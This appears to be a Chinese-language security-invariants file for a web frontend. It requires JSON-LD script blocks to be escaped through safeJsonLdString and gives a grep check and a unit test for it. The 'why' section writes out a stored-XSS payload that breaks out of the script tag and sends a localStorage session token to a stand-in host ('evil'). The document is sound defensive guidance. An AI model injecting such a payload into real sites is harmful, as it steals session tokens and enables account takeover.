# 前端安全不变量（Security Invariants）

> 这是给维护者看的代码不变量清单。
> 公开的 vulnerability disclosure policy 见 `SECURITY.md`。

本文档登记前端代码中**不可变更的安全保护点**。
每条不变量都对应一段 lint / 测试 / 代码模式，CI 应能捕获回归。

后端有同名文档 `backend/SECURITY.md`，编号空间互不重叠：
后端用 `INV-001`/`INV-002`...，前端用 `INV-FE-001`/`INV-FE-002`...

## 维护规则

修改本文件涉及的代码时**必须更新对应测试 / lint 规则**。
删除任何一条不变量需在 PR 描述写明理由并 CC superadmin review。

每条不变量包含四个字段：

- **保护点**：被保护的代码位置
- **测试 / lint**：CI 检测手段（grep 规则 / 单元测试 / e2e）
- **为什么**：攻击场景与历史背景
- **历史**：诞生时间与背景

---

## INV-FE-001 · 嵌入 `<script type="application/ld+json">` 必须用 safeJsonLdString

- **保护点**：所有 `<script type="application/ld+json">` 块。
  当前调用方：
  - `app/[locale]/u/[username]/page.tsx`（personJsonLd，含用户 bio）
  - `app/[locale]/docs/[...slug]/page.tsx`（articleJsonLd / breadcrumbJsonLd）
  - `app/layout.tsx`（WebSite / Organization 结构化数据）
- **统一工具**：`lib/json-ld.ts` 的 `safeJsonLdString(payload)`
- **测试 / lint**：
  - 暂时通过 grep 巡查兜底：
    `rg -t tsx -t ts 'dangerouslySetInnerHTML' app/ | grep -v safeJsonLdString | grep "application/ld\\+json"`
    应返回 0 行。建议未来加 ESLint 自定义规则。
  - 现有单元测试见：`tests/json-ld.test.ts`
    例如 `safeJsonLdString({bio: "</script><script>x</script>"})`
    输出不能包含字面 `<` 或 `</script>`，并且应包含转义后的 `\\u003c` 序列。
- **为什么**：`JSON.stringify` 默认不转义 `<` `>` `&`，攻击者把
  `</script><script>fetch("https://evil/?t="+localStorage.getItem("satoken"))</script>`
  写进任何 user-generated 字段（profile bio、displayName 等）即触发 stored XSS。
  satoken 存在 localStorage 且写入非 HttpOnly cookie（跨子域 pgAdmin 的设计取舍），
  一次 XSS 等于完整账户接管。
- **历史**：2026-05-07 三方 CR attack chain A 起点（详见内部报告）。
